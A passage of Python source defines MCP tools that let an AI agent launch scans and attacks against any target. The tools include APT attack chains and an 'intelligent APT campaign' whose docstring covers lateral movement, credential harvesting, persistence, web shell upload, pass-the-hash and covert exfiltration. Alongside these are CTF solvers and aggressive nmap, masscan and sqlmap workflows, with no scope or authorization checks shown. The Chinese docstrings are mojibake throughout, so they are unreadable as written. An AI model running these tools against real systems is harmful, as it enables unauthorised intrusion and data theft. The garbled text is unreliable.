        3. æƒé™æå‡ï¼šæœ¬åœ°æ¼æ´åˆ©ç”¨ã€é…ç½®é”™è¯¯åˆ©ç”¨
        4. æ¨ªå‘ç§»åŠ¨ï¼šå†…ç½‘æ‰«æã€å‡­æ®æ”¶é›†ã€è·³æ¿æ”»å‡»

        Args:
            target: ç›®æ ‡ç½‘ç»œæˆ–ä¸»æœºIP

        Returns:
            APTç½‘ç»œæ¸—é€é“¾æ‰§è¡Œç»“æœ
        """
        # æ„é€ ç½‘ç»œç›®æ ‡ä¿¡æ¯
        target_info = {
            "ports": [
                {"port": 22, "service": "ssh"},
                {"port": 445, "service": "smb"},
                {"port": 3389, "service": "rdp"}
            ]
        }

        return submit_apt_attack_chain(target, target_info, "network_compromise")

    @mcp.tool()
    def apt_comprehensive_attack(target: str) -> Dict[str, Any]:
        """
        æ‰§è¡ŒAPTç»¼åˆæ”»å‡»é“¾ - å…¨é¢çš„å¤šå‘é‡å¹¶å‘æ”»å‡»ã€‚

        è‡ªåŠ¨è¯†åˆ«ç›®æ ‡æ”»å‡»é¢å¹¶æ‰§è¡Œç›¸åº”çš„æ”»å‡»é“¾ï¼š
        - Webåº”ç”¨æ”»å‡»ï¼ˆå¦‚æœå‘ç°WebæœåŠ¡ï¼‰
        - ç½‘ç»œæœåŠ¡æ”»å‡»ï¼ˆSSHã€SMBã€RDPç­‰ï¼‰
        - æ•°æ®åº“æ”»å‡»ï¼ˆMySQLã€PostgreSQLç­‰ï¼‰
        - æ— çº¿ç½‘ç»œæ”»å‡»ï¼ˆå¦‚æœé€‚ç”¨ï¼‰

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå

        Returns:
            APTç»¼åˆæ”»å‡»é“¾æ‰§è¡Œç»“æœ
        """
        return submit_apt_attack_chain(target, None, "full_compromise")

    # ==================== è‡ªé€‚åº”æ”»å‡»å·¥å…· ====================

    @mcp.tool()
    def start_adaptive_apt_attack(target: str, target_info: Dict[str, Any] = None,
                                 attack_objective: str = "full_compromise") -> Dict[str, Any]:
        """
        å¯åŠ¨è‡ªé€‚åº”APTæ”»å‡» - æ™ºèƒ½åŒ–åŠ¨æ€è°ƒæ•´æ”»å‡»è·¯å¾„ã€‚

        è¿™ä¸ªåŠŸèƒ½ä¼šï¼š
        1. æ‰§è¡Œåˆå§‹æ”»å‡»å‘é‡
        2. åˆ†ææ¯ä¸ªæ”»å‡»çš„ç»“æœ
        3. æ ¹æ®è·å¾—çš„ä¿¡æ¯é‡æ–°è®¡ç®—æœ€ä¼˜æ”»å‡»è·¯å¾„
        4. åŠ¨æ€è°ƒæ•´æ”»å‡»ç­–ç•¥
        5. æŒç»­è¿­ä»£ç›´åˆ°è¾¾æˆæ”»å‡»ç›®æ ‡

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå
            target_info: ç›®æ ‡ä¿¡æ¯ï¼ˆç«¯å£ã€æœåŠ¡ç­‰ï¼‰ï¼Œå¦‚æœä¸ºç©ºåˆ™è‡ªåŠ¨ä¾¦å¯Ÿ
            attack_objective: æ”»å‡»ç›®æ ‡ï¼ˆfull_compromise, data_extraction, persistenceç­‰ï¼‰

        Returns:
            è‡ªé€‚åº”æ”»å‡»IDå’ŒçŠ¶æ€
        """
        data = {
            "target": target,
            "target_info": target_info,
            "attack_objective": attack_objective
        }
        return executor.execute_tool_with_data("adaptive_apt_attack", data)

    @mcp.tool()
    def get_adaptive_attack_status(attack_id: str) -> Dict[str, Any]:
        """
        è·å–è‡ªé€‚åº”æ”»å‡»çŠ¶æ€ - æŸ¥çœ‹æ”»å‡»è¿›å±•å’Œå‘ç°çš„ä¿¡æ¯ã€‚

        Args:
            attack_id: è‡ªé€‚åº”æ”»å‡»ID

        Returns:
            æ”»å‡»çŠ¶æ€è¯¦æƒ…ï¼ŒåŒ…æ‹¬ï¼š
            - å½“å‰æ”»å‡»é˜¶æ®µ
            - å·²å®Œæˆçš„æ”»å‡»å‘é‡æ•°é‡
            - å¤±è´¥çš„æ”»å‡»å‘é‡æ•°é‡
            - å½“å‰è·å¾—çš„èƒ½åŠ›
            - å‘ç°çš„ä¿¡æ¯
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def trigger_next_attack_phase(attack_id: str) -> Dict[str, Any]:
        """
        æ‰‹åŠ¨è§¦å‘ä¸‹ä¸€æ”»å‡»é˜¶æ®µ - å¼ºåˆ¶è¿›å…¥ä¸‹ä¸€è½®æ”»å‡»ã€‚

        Args:
            attack_id: è‡ªé€‚åº”æ”»å‡»ID

        Returns:
            è§¦å‘ç»“æœ
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def adaptive_web_penetration(target: str) -> Dict[str, Any]:
        """
        è‡ªé€‚åº”Webæ¸—é€æµ‹è¯• - æ™ºèƒ½åŒ–Webåº”ç”¨æ”»å‡»ã€‚

        ä¼šæ ¹æ®å‘ç°çš„WebæŠ€æœ¯ã€æ¡†æ¶ã€æ¼æ´ç­‰ä¿¡æ¯åŠ¨æ€è°ƒæ•´æ”»å‡»ç­–ç•¥ï¼š
        - å‘ç°CMS -> é’ˆå¯¹æ€§CMSæ¼æ´åˆ©ç”¨
        - å‘ç°æ•°æ®åº“ -> SQLæ³¨å…¥æ”»å‡»
        - å‘ç°ä¸Šä¼ åŠŸèƒ½ -> Web Shellä¸Šä¼ 
        - è·å¾—Shell -> æƒé™æå‡å’ŒæŒä¹…åŒ–

        Args:
            target: ç›®æ ‡Webåº”ç”¨URLæˆ–IP

        Returns:
            è‡ªé€‚åº”Webæ”»å‡»ç»“æœ
        """
        target_info = {
            "ports": [
                {"port": 80, "service": "http"},
                {"port": 443, "service": "https"}
            ]
        }

        return start_adaptive_apt_attack(target, target_info, "web_compromise")

    @mcp.tool()
    def adaptive_network_penetration(target: str) -> Dict[str, Any]:
        """
        è‡ªé€‚åº”ç½‘ç»œæ¸—é€æµ‹è¯• - æ™ºèƒ½åŒ–ç½‘ç»œæ”»å‡»ã€‚

        ä¼šæ ¹æ®å‘ç°çš„æœåŠ¡ã€æ“ä½œç³»ç»Ÿã€æ¼æ´ç­‰ä¿¡æ¯åŠ¨æ€è°ƒæ•´æ”»å‡»ç­–ç•¥ï¼š
        - å‘ç°SSH -> æš´åŠ›ç ´è§£æˆ–æ¼æ´åˆ©ç”¨
        - å‘ç°SMB -> SMBæ¼æ´åˆ©ç”¨æˆ–å“ˆå¸Œä¼ é€’
        - è·å¾—å‡­æ® -> æ¨ªå‘ç§»åŠ¨
        - è·å¾—æƒé™ -> æƒé™æå‡å’ŒæŒä¹…åŒ–

        Args:
            target: ç›®æ ‡ç½‘ç»œæˆ–ä¸»æœºIP

        Returns:
            è‡ªé€‚åº”ç½‘ç»œæ”»å‡»ç»“æœ
        """
        target_info = {
            "ports": [
                {"port": 22, "service": "ssh"},
                {"port": 445, "service": "smb"},
                {"port": 3389, "service": "rdp"}
            ]
        }

        return start_adaptive_apt_attack(target, target_info, "network_compromise")

    @mcp.tool()
    def intelligent_apt_campaign(target: str) -> Dict[str, Any]:
        """
        æ™ºèƒ½APTæ”»å‡»æ´»åŠ¨ - æœ€é«˜çº§åˆ«çš„è‡ªé€‚åº”æ”»å‡»ã€‚

        æ¨¡æ‹ŸçœŸå®APTç»„ç»‡çš„æ”»å‡»æ‰‹æ³•ï¼š
        1. å…¨é¢ä¾¦å¯Ÿå’Œä¿¡æ¯æ”¶é›†
        2. å¤šå‘é‡å¹¶å‘åˆå§‹è®¿é—®å°è¯•
        3. æ ¹æ®æˆåŠŸçš„æ”»å‡»å‘é‡è°ƒæ•´ç­–ç•¥
        4. æ™ºèƒ½æƒé™æå‡å’Œæ¨ªå‘ç§»åŠ¨
        5. å»ºç«‹å¤šé‡æŒä¹…åŒ–æœºåˆ¶
        6. éšè”½æ•°æ®æ”¶é›†å’Œæ¸—å‡º

        Args:
            target: ç›®æ ‡ç»„ç»‡çš„ä¸»è¦IPæˆ–åŸŸå

        Returns:
            æ™ºèƒ½APTæ”»å‡»æ´»åŠ¨ç»“æœ
        """
        return start_adaptive_apt_attack(target, None, "apt_campaign")

    # ==================== CTFä¸“ç”¨å·¥å…· ====================

    @mcp.tool()
    def enable_ctf_mode() -> Dict[str, Any]:
        """
        å¯ç”¨CTFç«èµ›æ¨¡å¼ã€‚

        å¯ç”¨åç³»ç»Ÿå°†ï¼š
        1. è‡ªåŠ¨æ£€æµ‹å’Œæå–æ‰€æœ‰å·¥å…·è¾“å‡ºä¸­çš„Flag
        2. æ”¯æŒå¤šç§Flagæ ¼å¼ï¼ˆCTF{}, flag{}, å“ˆå¸Œç­‰ï¼‰
        3. æä¾›å®æ—¶Flagç»Ÿè®¡å’Œé¢˜ç›®ç®¡ç†
        4. ä¼˜åŒ–æ”»å‡»ç­–ç•¥ä»¥é€‚åº”CTFç¯å¢ƒ

        Returns:
            CTFæ¨¡å¼å¯ç”¨ç»“æœ
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def disable_ctf_mode() -> Dict[str, Any]:
        """
        ç¦ç”¨CTFç«èµ›æ¨¡å¼ï¼Œè¿”å›æ­£å¸¸æ¸—é€æµ‹è¯•æ¨¡å¼ã€‚

        Returns:
            CTFæ¨¡å¼ç¦ç”¨ç»“æœ
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def create_ctf_session(name: str, team_name: str = "") -> Dict[str, Any]:
        """
        åˆ›å»ºCTFç«èµ›ä¼šè¯ã€‚

        Args:
            name: ç«èµ›åç§°
            team_name: é˜Ÿä¼åç§°ï¼ˆå¯é€‰ï¼‰

        Returns:
            CTFä¼šè¯åˆ›å»ºç»“æœ
        """
        data = {
            "name": name,
            "team_name": team_name
        }
        return executor.execute_tool_with_data("ctf_session", data)

    @mcp.tool()
    def add_ctf_challenge(name: str, category: str, port: int, service: str = "http") -> Dict[str, Any]:
        """
        æ·»åŠ CTFé¢˜ç›®åˆ°å½“å‰ä¼šè¯ã€‚

        Args:
            name: é¢˜ç›®åç§°
            category: é¢˜ç›®åˆ†ç±»ï¼ˆweb, pwn, crypto, misc, reverseï¼‰
            port: é¢˜ç›®ç«¯å£
            service: æœåŠ¡ç±»å‹ï¼ˆhttp, ssh, ftpç­‰ï¼‰

        Returns:
            é¢˜ç›®æ·»åŠ ç»“æœ
        """
        data = {
            "name": name,
            "category": category,
            "port": port,
            "service": service
        }
        return executor.execute_tool_with_data("ctf_challenge", data)

    @mcp.tool()
    def get_detected_flags() -> Dict[str, Any]:
        """
        è·å–æ‰€æœ‰æ£€æµ‹åˆ°çš„Flagã€‚

        Returns:
            åŒ…å«æ‰€æœ‰Flagçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š
            - Flagå†…å®¹
            - æ ¼å¼ç±»å‹
            - å‘ç°æ¥æº
            - ç½®ä¿¡åº¦
            - å‘ç°æ—¶é—´
            - æäº¤çŠ¶æ€
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def get_ctf_challenges_status() -> Dict[str, Any]:
        """
        è·å–æ‰€æœ‰CTFé¢˜ç›®çš„çŠ¶æ€ã€‚

        Returns:
            åŒ…å«æ‰€æœ‰é¢˜ç›®çš„çŠ¶æ€ä¿¡æ¯ï¼š
            - é¢˜ç›®åç§°å’Œåˆ†ç±»
            - è§£é¢˜çŠ¶æ€
            - å‘ç°çš„Flagæ•°é‡
            - å¼€å§‹å’Œå®Œæˆæ—¶é—´
        """
        return {"success": False, "error": "æœ¬åœ°æ‰§è¡Œæ¨¡å¼ï¼Œæ— éœ€APIè°ƒç”¨"}

    @mcp.tool()
    def ctf_quick_scan(target: str, challenge_name: str = "", ports: str = "80,443,22,21,8080") -> Dict[str, Any]:
        """
        CTFå¿«é€Ÿæ‰«æ - é’ˆå¯¹CTFç¯å¢ƒä¼˜åŒ–çš„å¿«é€Ÿæ¼æ´å‘ç°ã€‚

        æ‰§è¡Œå¿«é€Ÿç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«å’ŒåŸºç¡€æ¼æ´æ£€æµ‹ï¼Œ
        è‡ªåŠ¨æå–å‘ç°çš„Flagã€‚

        Args:
            target: ç›®æ ‡IPåœ°å€æˆ–åŸŸå
            challenge_name: é¢˜ç›®åç§°ï¼ˆç”¨äºFlagå…³è”ï¼‰
            ports: è¦æ‰«æçš„ç«¯å£åˆ—è¡¨

        Returns:
            å¿«é€Ÿæ‰«æç»“æœå’Œå‘ç°çš„Flag
        """
        # æäº¤å¿«é€Ÿæ‰«æä»»åŠ¡
        scan_tasks = []

        # 1. å¿«é€Ÿç«¯å£æ‰«æ
        nmap_task = {
            "tool_name": "nmap",
            "parameters": {
                "target": target,
                "scan_type": "fast",
                "ports": ports
            },
            "priority": 4,  # ç´§æ€¥ä¼˜å…ˆçº§
            "metadata": {"challenge_name": challenge_name}
        }
        scan_tasks.append(submit_concurrent_task(**nmap_task))

        # 2. WebæœåŠ¡å¿«é€Ÿæ‰«æï¼ˆå¦‚æœæœ‰Webç«¯å£ï¼‰
        if "80" in ports or "443" in ports or "8080" in ports:
            gobuster_task = {
                "tool_name": "gobuster",
                "parameters": {
                    "target": f"http://{target}",
                    "wordlist": "/usr/share/wordlists/dirb/common.txt",
                    "threads": "50"
                },
                "priority": 4,
                "metadata": {"challenge_name": challenge_name}
            }
            scan_tasks.append(submit_concurrent_task(**gobuster_task))

            # Nikto Webæ¼æ´æ‰«æ
            nikto_task = {
                "tool_name": "nikto",
                "parameters": {
                    "target": f"http://{target}"
                },
                "priority": 3,
                "metadata": {"challenge_name": challenge_name}
            }
            scan_tasks.append(submit_concurrent_task(**nikto_task))

        return {
            "success": True,
            "message": f"CTFå¿«é€Ÿæ‰«æå·²å¯åŠ¨ï¼Œç›®æ ‡: {target}",
            "target": target,
            "challenge_name": challenge_name,
            "submitted_tasks": len(scan_tasks),
            "task_results": scan_tasks
        }

    @mcp.tool()
    def ctf_web_attack(target: str, challenge_name: str = "") -> Dict[str, Any]:
        """
        CTF Webæ”»å‡»é“¾ - ä¸“é—¨é’ˆå¯¹CTF Webé¢˜ç›®çš„æ”»å‡»ã€‚

        æ‰§è¡Œå¸¸è§çš„Webæ¼æ´æ”»å‡»ï¼š
        1. SQLæ³¨å…¥æ£€æµ‹å’Œåˆ©ç”¨
        2. XSSæ¼æ´æ£€æµ‹
        3. æ–‡ä»¶ä¸Šä¼ æ¼æ´
        4. ç›®å½•éå†
        5. å‘½ä»¤æ³¨å…¥

        Args:
            target: ç›®æ ‡Webåº”ç”¨URL
            challenge_name: é¢˜ç›®åç§°

        Returns:
            Webæ”»å‡»é“¾æ‰§è¡Œç»“æœ
        """
        attack_tasks = []

        # 1. SQLæ³¨å…¥æ”»å‡»
        sqlmap_task = {
            "tool_name": "sqlmap",
            "parameters": {
                "target": target,
                "crawl": "2",
                "batch": True,
                "risk": "3",
                "level": "3"
            },
            "priority": 4,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**sqlmap_task))

        # 2. ç›®å½•æš´åŠ›ç ´è§£
        gobuster_task = {
            "tool_name": "gobuster",
            "parameters": {
                "target": target,
                "wordlist": "/usr/share/wordlists/dirb/big.txt",
                "extensions": "php,html,txt,js,zip,bak"
            },
            "priority": 3,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**gobuster_task))

        # 3. Webæ¼æ´æ‰«æ
        nuclei_task = {
            "tool_name": "nuclei",
            "parameters": {
                "target": target,
                "templates": "web-vulnerabilities,exposures,misconfiguration"
            },
            "priority": 3,
            "metadata": {"challenge_name": challenge_name}
        }
        attack_tasks.append(submit_concurrent_task(**nuclei_task))

        return {
            "success": True,
            "message": f"CTF Webæ”»å‡»é“¾å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}",
            "target": target,
            "challenge_name": challenge_name,
            "submitted_tasks": len(attack_tasks),
            "task_results": attack_tasks
        }

    # ==================== æ™ºèƒ½åˆ†æå·¥å…· ====================

    @mcp.tool()
    def optimize_tool_parameters(tool: str, target_type: str = "unknown",
                                time_constraint: str = "quick", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        ä¼˜åŒ–æ¸—é€æµ‹è¯•å·¥å…·å‚æ•°ä»¥æé«˜å‡†ç¡®æ€§å’Œæ•ˆç‡ã€‚

        Args:
            tool: å·¥å…·åç§° (nmap, gobuster, sqlmap, hydraç­‰)
            target_type: ç›®æ ‡ç±»å‹ (web, network, database, windows, linux)
            time_constraint: æ—¶é—´çº¦æŸ (quick, standard, thorough)
            stealth_mode: æ˜¯å¦å¯ç”¨éšè”½æ¨¡å¼

        Returns:
            ä¼˜åŒ–åçš„å·¥å…·å‚æ•°é…ç½®
        """
        data = {
            "tool": tool,
            "target_type": target_type,
            "time_constraint": time_constraint,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("optimize_parameters", data)

    @mcp.tool()
    def correlate_scan_results(tool_results: Dict[str, Dict]) -> Dict[str, Any]:
        """
        å…³è”å’Œåˆ†æå¤šä¸ªæ‰«æå·¥å…·çš„ç»“æœï¼Œè¯†åˆ«æ¼æ´æ¨¡å¼å’Œæ”»å‡»è·¯å¾„ã€‚

        Args:
            tool_results: å¤šä¸ªå·¥å…·çš„æ‰«æç»“æœå­—å…¸
                æ ¼å¼: {"nmap": {...}, "gobuster": {...}, "nuclei": {...}}

        Returns:
            å…³è”åˆ†æç»“æœï¼ŒåŒ…å«å‘ç°çš„æ¼æ´æ¨¡å¼å’Œå»ºè®®
        """
        data = {
            "tool_results": tool_results
        }
        return executor.execute_tool_with_data("correlate_results", data)

    @mcp.tool()
    def generate_adaptive_scan_plan(target: str, initial_results: Dict = None,
                                  time_budget: str = "standard") -> Dict[str, Any]:
        """
        åŸºäºç›®æ ‡ç‰¹å¾å’Œå·²æœ‰ç»“æœç”Ÿæˆè‡ªé€‚åº”æ‰«æè®¡åˆ’ã€‚

        Args:
            target: ç›®æ ‡IPã€åŸŸåæˆ–URL
            initial_results: åˆæ­¥æ‰«æç»“æœï¼ˆå¯é€‰ï¼‰
            time_budget: æ—¶é—´é¢„ç®— (quick, standard, thorough)

        Returns:
            è‡ªé€‚åº”æ‰«æè®¡åˆ’ï¼ŒåŒ…å«ä¼˜å…ˆçº§æ’åºçš„æ‰«ææ­¥éª¤
        """
        data = {
            "target": target,
            "initial_results": initial_results or {},
            "time_budget": time_budget
        }
        return executor.execute_tool_with_data("adaptive_scan_plan", data)

    @mcp.tool()
    def intelligent_smart_scan(target: str, objectives: List[str] = None,
                             time_budget: str = "standard", stealth_mode: bool = False) -> Dict[str, Any]:
        """
        æ‰§è¡Œæ™ºèƒ½æ‰«æ - é›†æˆå‚æ•°ä¼˜åŒ–å’Œè‡ªé€‚åº”ç­–ç•¥çš„å…¨æµç¨‹æ‰«æã€‚

        Args:
            target: ç›®æ ‡IPã€åŸŸåæˆ–URL
            objectives: æ‰«æç›®æ ‡åˆ—è¡¨ (é»˜è®¤: ["port_scan", "web_scan"])
            time_budget: æ—¶é—´é¢„ç®— (quick, standard, thorough)
            stealth_mode: æ˜¯å¦å¯ç”¨éšè”½æ¨¡å¼

        Returns:
            æ™ºèƒ½æ‰«æè®¡åˆ’ï¼ŒåŒ…å«ä¼˜åŒ–åçš„å‚æ•°å’Œæ‰§è¡Œç­–ç•¥
        """
        data = {
            "target": target,
            "objectives": objectives or ["port_scan", "web_scan"],
            "time_budget": time_budget,
            "stealth_mode": stealth_mode
        }
        return executor.execute_tool_with_data("smart_scan", data)

    @mcp.tool()
    def analyze_target_intelligence(target: str, scan_results: Dict = None) -> Dict[str, Any]:
        """
        åŸºäºæ‰«æç»“æœåˆ†æç›®æ ‡ç‰¹å¾å’Œæ¨èæ”»å‡»å‘é‡ã€‚

        Args:
            target: ç›®æ ‡IPã€åŸŸåæˆ–URL
            scan_results: æ‰«æç»“æœæ•°æ®ï¼ˆå¯é€‰ï¼‰

        Returns:
            ç›®æ ‡åˆ†æç»“æœï¼ŒåŒ…å«ç›®æ ‡ç±»å‹ã€æ¨èæ”»å‡»å‘é‡å’Œå®‰å…¨è¯„ä¼°
        """
        data = {
            "target": target,
            "scan_results": scan_results or {}
        }
        return executor.execute_tool_with_data("analyze_target", data)

    @mcp.tool()
    def intelligent_ctf_solver(target: str, challenge_category: str = "unknown",
                             time_limit: str = "30min") -> Dict[str, Any]:
        """
        æ™ºèƒ½CTFé¢˜ç›®æ±‚è§£å™¨ - åŸºäºé¢˜ç›®ç‰¹å¾è‡ªåŠ¨é€‰æ‹©æœ€ä¼˜æ”»å‡»ç­–ç•¥ã€‚

        Args:
            target: CTFé¢˜ç›®åœ°å€æˆ–IP
            challenge_category: é¢˜ç›®åˆ†ç±» (web, pwn, crypto, misc, reverse)
            time_limit: æ—¶é—´é™åˆ¶ (15min, 30min, 1hour)

        Returns:
            CTFæ±‚è§£è®¡åˆ’å’Œæ‰§è¡Œç»“æœ
        """
        # é¦–å…ˆåˆ†æç›®æ ‡
        analysis_result = analyze_target_intelligence(target)

        # åŸºäºåˆ†æç»“æœç”ŸæˆCTFä¸“ç”¨æ‰«æè®¡åˆ’
        if challenge_category == "web" or "web" in analysis_result.get("target_type", ""):
            return ctf_web_attack(target, f"Auto-CTF-{challenge_category}")
        else:
            # ç”Ÿæˆé€šç”¨CTFæ‰«æè®¡åˆ’
            time_budget = "quick" if "15min" in time_limit else "standard"
            return generate_adaptive_scan_plan(target, time_budget=time_budget)

    @mcp.tool()
    def intelligent_vulnerability_assessment(target: str, assessment_depth: str = "comprehensive") -> Dict[str, Any]:
        """
        æ™ºèƒ½æ¼æ´è¯„ä¼° - å…¨é¢çš„æ¼æ´å‘ç°å’Œé£é™©åˆ†æã€‚

        Args:
            target: ç›®æ ‡IPã€åŸŸåæˆ–URL
            assessment_depth: è¯„ä¼°æ·±åº¦ (quick, comprehensive, deep)

        Returns:
            å®Œæ•´çš„æ¼æ´è¯„ä¼°æŠ¥å‘Šï¼ŒåŒ…å«å‘ç°çš„æ¼æ´ã€é£é™©ç­‰çº§å’Œä¿®å¤å»ºè®®
        """
        # æ‰§è¡Œæ™ºèƒ½æ‰«æ
        smart_scan_result = intelligent_smart_scan(
            target=target,
            time_budget=assessment_depth,
            stealth_mode=False
        )

        # å¦‚æœæ˜¯Webç›®æ ‡ï¼Œæ‰§è¡ŒWebä¸“ç”¨è¯„ä¼°
        if target.startswith("http"):
            web_assessment = advanced_web_security_assessment(target, True)
            smart_scan_result["web_assessment"] = web_assessment

        return {
            "success": True,
            "target": target,
            "assessment_depth": assessment_depth,
            "scan_plan": smart_scan_result,
            "message": f"æ™ºèƒ½æ¼æ´è¯„ä¼°è®¡åˆ’å·²ç”Ÿæˆï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def intelligent_penetration_testing(target: str, scope: str = "single",
                                       methodology: str = "owasp") -> Dict[str, Any]:
        """
        æ™ºèƒ½æ¸—é€æµ‹è¯• - éµå¾ªæ ‡å‡†æ–¹æ³•è®ºçš„å…¨é¢æ¸—é€æµ‹è¯•ã€‚

        Args:
            target: ç›®æ ‡IPã€åŸŸåæˆ–URL
            scope: æµ‹è¯•èŒƒå›´ (single, subnet, domain)
            methodology: æµ‹è¯•æ–¹æ³•è®º (owasp, nist, ptes)

        Returns:
            æ¸—é€æµ‹è¯•æ‰§è¡Œè®¡åˆ’å’Œåˆæ­¥ç»“æœ
        """
        # ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†å’Œç›®æ ‡åˆ†æ
        target_analysis = analyze_target_intelligence(target)

        # ç¬¬äºŒé˜¶æ®µï¼šç”Ÿæˆè‡ªé€‚åº”æ”»å‡»è®¡åˆ’
        attack_plan = generate_adaptive_scan_plan(
            target=target,
            initial_results=target_analysis.get("analysis_summary", {}),
            time_budget="thorough"
        )

        # ç¬¬ä¸‰é˜¶æ®µï¼šæ‰§è¡Œç›¸åº”çš„æ¸—é€æµ‹è¯•
        if target_analysis.get("target_type") == "web":
            pentest_result = apt_web_application_attack(target)
        else:
            pentest_result = apt_network_penetration(target)

        return {
            "success": True,
            "target": target,
            "scope": scope,
            "methodology": methodology,
            "target_analysis": target_analysis,
            "attack_plan": attack_plan,
            "execution_result": pentest_result,
            "message": f"æ™ºèƒ½æ¸—é€æµ‹è¯•å·²å¯åŠ¨ï¼Œç›®æ ‡: {target}ï¼Œæ–¹æ³•è®º: {methodology}"
        }

    # ==================== é¢„å®šä¹‰æ™ºèƒ½å·¥ä½œæµ ====================

    @mcp.tool()
    def auto_web_security_workflow(target: str, depth: str = "comprehensive") -> Dict[str, Any]:
        """
        è‡ªåŠ¨åŒ–Webå®‰å…¨è¯„ä¼°å·¥ä½œæµ - å®Œæ•´çš„Webåº”ç”¨å®‰å…¨æµ‹è¯•æµç¨‹ã€‚

        Args:
            target: ç›®æ ‡Webåº”ç”¨URL
            depth: è¯„ä¼°æ·±åº¦ (quick, comprehensive, deep)

        Returns:
            å®Œæ•´çš„Webå®‰å…¨è¯„ä¼°ç»“æœ
        """
        workflow_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†
        step1 = {
            "stage": "information_gathering",
            "description": "Webåº”ç”¨ä¿¡æ¯æ”¶é›†",
            "tools": [
                {"tool": "nmap_scan", "params": {"target": target, "scan_type": "-sV", "ports": "80,443,8080,8443"}},
                {"tool": "whatweb_scan", "params": {"target": target}},
                {"tool": "analyze_target_intelligence", "params": {"target": target}}
            ]
        }
        workflow_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šç›®å½•å‘ç°
        step2 = {
            "stage": "directory_discovery",
            "description": "Webç›®å½•å’Œæ–‡ä»¶å‘ç°",
            "tools": [
                {"tool": "gobuster_scan", "params": {"url": target, "mode": "dir"}},
                {"tool": "ffuf_scan", "params": {"url": f"{target}/FUZZ"}},
                {"tool": "feroxbuster_scan", "params": {"url": target}}
            ]
        }
        workflow_steps.append(step2)

        # ç¬¬ä¸‰é˜¶æ®µï¼šæ¼æ´æ‰«æ
        step3 = {
            "stage": "vulnerability_scanning",
            "description": "Webåº”ç”¨æ¼æ´æ‰«æ",
            "tools": [
                {"tool": "nuclei_web_scan", "params": {"target": target, "scan_type": depth}},
                {"tool": "nikto_scan", "params": {"target": target}},
                {"tool": "sqlmap_scan", "params": {"url": target, "additional_args": "--crawl=2 --batch"}}
            ]
        }
        workflow_steps.append(step3)

        # ç¬¬å››é˜¶æ®µï¼šä¸“é¡¹æµ‹è¯•
        if depth in ["comprehensive", "deep"]:
            step4 = {
                "stage": "specialized_testing",
                "description": "ä¸“é¡¹å®‰å…¨æµ‹è¯•",
                "tools": [
                    {"tool": "wpscan_scan", "params": {"target": target}},
                    {"tool": "wafw00f_scan", "params": {"target": target}},
                    {"tool": "wfuzz_scan", "params": {"target": f"{target}/FUZZ"}}
                ]
            }
            workflow_steps.append(step4)

        return {
            "success": True,
            "workflow_name": "auto_web_security_workflow",
            "target": target,
            "depth": depth,
            "total_stages": len(workflow_steps),
            "workflow_steps": workflow_steps,
            "estimated_time": f"{len(workflow_steps) * 10}-{len(workflow_steps) * 20} minutes",
            "message": f"è‡ªåŠ¨åŒ–Webå®‰å…¨è¯„ä¼°å·¥ä½œæµå·²ç”Ÿæˆï¼Œç›®æ ‡: {target}"
        }

    @mcp.tool()
    def auto_network_discovery_workflow(target_network: str, scan_intensity: str = "standard") -> Dict[str, Any]:
        """
        è‡ªåŠ¨åŒ–ç½‘ç»œå‘ç°å·¥ä½œæµ - å®Œæ•´çš„ç½‘ç»œä¾¦å¯Ÿå’ŒæœåŠ¡å‘ç°ã€‚

        Args:
            target_network: ç›®æ ‡ç½‘ç»œèŒƒå›´ (å¦‚ 192.168.1.0/24)
            scan_intensity: æ‰«æå¼ºåº¦ (light, standard, aggressive)

        Returns:
            ç½‘ç»œå‘ç°å·¥ä½œæµç»“æœ
        """
        workflow_steps = []

        # ç¬¬ä¸€é˜¶æ®µï¼šä¸»æœºå‘ç°
        step1 = {
            "stage": "host_discovery",
            "description": "ç½‘ç»œä¸»æœºå‘ç°",
            "tools": [
                {"tool": "nmap_scan", "params": {"target": target_network, "scan_type": "-sn"}},
                {"tool": "masscan_scan", "params": {"target": target_network, "ports": "80,443,22,21,23,25,53,110,143,993,995"}},
                {"tool": "fping_scan", "params": {"targets": target_network}}
            ]
        }
        workflow_steps.append(step1)

        # ç¬¬äºŒé˜¶æ®µï¼šç«¯å£æ‰«æ
        if scan_intensity in ["standard", "aggressive"]:
            step2 = {
                "stage": "port_scanning",
                "description": "ç«¯å£æ‰«æå’ŒæœåŠ¡è¯†åˆ«",
                "tools": [
                    {"tool": "nmap_scan", "params": {"target": target_network, "scan_type": "-sS", "ports": "21,22,80,443,8080", "additional_args": "-T5 --open"}},
                    {"tool": "zmap_scan", "params": {"target": target_network, "port": "80"}},
                    {"tool": "masscan_fast_scan", "params": {"target": target_network}}
                ]
            }
            workflow_steps.append(step2)

        # ç¬¬ä¸‰é˜¶æ®µï¼šæœåŠ¡æšä¸¾
        if scan_intensity == "aggressive":
            step3 = {
                "stage": "service_enumeration",
                "description": "æœåŠ¡æ·±åº¦æšä¸¾",
                "tools": [
                    {"tool": "enum4linux_scan", "params": {"target": target_network}},
